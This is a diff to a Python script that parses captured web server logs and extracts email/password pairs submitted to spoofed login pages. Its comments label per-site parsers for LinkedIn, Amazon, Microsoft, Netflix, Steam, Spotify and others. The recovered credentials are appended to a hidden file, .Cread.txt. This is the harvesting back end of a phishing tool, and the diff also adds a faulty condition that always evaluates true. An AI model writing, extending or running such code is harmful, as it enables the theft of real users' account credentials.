@@ -4,6 +4,7 @@ import re
 import sys
 import time
 import subprocess
+from urllib.parse import unquote 
 from subprocess import PIPE
 
 user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
@@ -26,62 +27,65 @@ class dns_result :
               Log_read = Log_Handel.readlines()
           for line in Log_read:     
               if '%40'in  line :
-
-                if "username" in line  or "key1" in line or "loginfmt" in line :
-                      line  =  line.split('=')
-                     
-                      if "false&time_to_submit"  in line or  "&embed" in line :
-                           line = line[-4:]
-                      elif "0&commit" in line:
-                            line = line[-4:]
-                            line.insert(0,'oo') 
-
-                elif "openid.identity=" in line    :
-                     line  = line.split('=')
-                     line = line[-4:]
-                     if "true" in line[-1] :
-                         line.remove(line[-1]) 
-                         line.insert(0,'fff')
-                         line.remove(line[-2]) 
-                     else:    
-                         line.remove(line[-2]) 
-
-                elif   "from=mail"  in line  :
-                        line  = line.split('=')
-                        line = line[-3:]
-
-                else:                 
-                      if "withFields=" in line  or "&cid=" in line\
-                      or  "email=" in line :  
-                          line  = line.split('=')
-                          if "on&pageId" in line :
-                            line=line[2:5]
-                            line.insert(0,'fff')
-                          else:   
-                             line=line[1:3]
-                             line = str("".join(line)).split('&')
-                             line.insert(0,'uuu')
-
-                      else:                         
-                          line  = line.split('&')
-
-                                    
-                line_split = str(line[1:3]).split('password')  
-                line_cread = str("".join(line_split)).replace("&",'').replace('+',"").replace('&password',' ').replace('&captcha_text',' ')\
-                .replace("+&session_password=1",'').replace("&session_key ",'').replace('session_key=','')\
-                .replace("+",'').replace(",",'').replace("&create",'').replace("&passwd",'').replace("user%5Bremember_me%5D",'').replace("key1",'')\
-                .replace("passwd",'').replace("create",'').split()
-
-                line_cread_1 = str("".join(line_cread[0])).replace("['",'').replace("'",'')\
-                .replace('%40','@').replace("&password",'').replace('+&key1','').replace('&key1','')\
-                .replace('&session_password=1','').replace("&session_key",'').replace("session_password=",'').replace("user%5Bremember_me%5D",'').replace(",",'')
                 try: 
-                    line_cread_2 = str("".join(line_cread[1])).replace("]",'')\
-                    .replace("']",'').replace("'",'').replace('\\n','').replace("&signIn",'')\
-                    .replace('&isJsEnabled','').replace("&session_key=",'').replace('&session_password=1','')\
-                    .replace("+&session_password",'').replace("session_password=",'').replace(",",'')\
-                    .replace("&ps",'').replace("&rememberMe",'').replace("password",'').replace("signIn",'').replace('session_=','')\
-                    .replace("captcha_text",'').replace("remember",'').replace("ps",'').replace("Me",'').strip()  
+                    if "&sgnBt" in line :
+                        #shopping
+                        rego      = str(re.findall("[&userid=]\D+\S%40+.+",line)).split('=')
+                        line_cread_1  = unquote(rego[1][:-5])
+                        line_cread_2  = unquote(rego[2][:-6])
+                    elif "&session_key" in line :
+                        #linkedin
+                        rego = str(re.findall("&session_key\D+\S%40+.+",line)).split("=")
+                        line_cread_1  = unquote(rego[1][:-17])
+                        line_cread_2  = unquote(rego[2][:-4])
+                    elif "openid.claimed_id" in line:
+                         #amazon
+                         rego = str(re.findall("&email=.+",line)).split('=')
+                         line_cread_1  = unquote(rego[1][:-7])
+                         line_cread_2  = unquote(rego[3][:-2])
+                    elif "username=" in line:
+                          #create-gitlabe-steam-spotify
+                          rego = str(re.findall("username.+",line)).split("&") 
+                          if "commit=Sign+in']" in rego:
+                              line_cread_1 = unquote(rego[0][11:])
+                              line_cread_2 = unquote(rego[1][9:])
+                          elif "&captcha_text=" in line :  
+                              line_cread_1 = unquote(rego[0][11:])
+                              line_cread_2 = unquote(rego[1][9:])  
+                          elif "g-recaptcha-response=']" in rego :
+                              line_cread_1 = unquote(rego[0][11:])
+                              line_cread_2 = unquote(rego[1][9:]) 
+                          else:    
+                              line_cread_1 =unquote(rego[0][11:])
+                              line_cread_2  = unquote(rego[1][9:-2])                              
+                    elif "IsFidoSupported=" in line : 
+                          #microsoft
+                          rego = str("".join(re.findall("[^=]",line))).split("&")
+                          line_cread_1  = unquote(rego[0][-23:])
+                          line_cread_2  = unquote(rego[1][6:])                          
+                    elif "csrf=" in line :
+                          #myspace
+                          rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=') 
+                          if "&pageId" in line: 
+                              line_cread_1  = unquote(rego[1][:-9])
+                              line_cread_2  = unquote(rego[2][:-7])
+                          else:    
+                              line_cread_1  = unquote(rego[1][:-9])
+                              line_cread_2  = unquote(rego[2][:-11]) 
+                    elif "Cemail&authURL" in line :
+                          #netflax
+                          rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=') 
+                          line_cread_1  = unquote(rego[1][:-9])
+                          line_cread_2  = unquote(rego[2][:-11])  
+                    elif "submit&cid=Thg7" in line :
+                          #origin
+                          rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=')
+                          line_cread_1  = unquote(rego[1][:-9])
+                          line_cread_2  = unquote(rego[2][:-9])  
+                    elif "&redirect=&login=" in line :
+                          rego = str(re.findall("[&login=]\D+\S%40+.+",line)).split('=')
+                          line_cread_1  = unquote(rego[2][:-9])
+                          line_cread_2  = unquote(rego[3][:-21])            
                     with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
                         if line_cread_1 == "":
                               Cread_User.write("---------"+'\n'+line_cread_2.replace("%40",'@')+'\n')
@@ -94,7 +98,7 @@ class dns_result :
                 with open(Path_St+'/ServerLog/log_access.log','r') as accesslog:
                         accesslog = accesslog.readlines()#[-243:]
                 for line1 in accesslog:    
-                      if "POST" in line1:
+                      if "POST"  or "GET"in line1:
                           self.domain_web = str(re.findall('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', line1 ))\
                           .replace("[('', '",'').replace("')]",'').replace("', '.",'.').replace('[]','').replace('\n','')
                           if self.domain_web not in  list_web:
@@ -123,4 +127,3 @@ class dns_result :
       
 if __name__ =='__main__':
      dns_result()  
-
